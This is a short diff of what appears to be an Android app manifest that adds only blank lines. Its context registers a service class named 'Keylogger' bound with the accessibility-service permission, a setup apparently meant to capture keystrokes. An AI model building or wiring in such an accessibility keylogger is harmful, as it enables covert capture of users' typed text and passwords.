@@ -25,6 +25,8 @@
 
         <service android:name="com.custom.metinatac.customscreen.CornerService"></service>
         <service android:name="com.custom.metinatac.customscreen.Keylogger"
+
+
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:label="@string/accessibility_service_label">
             <intent-filter>
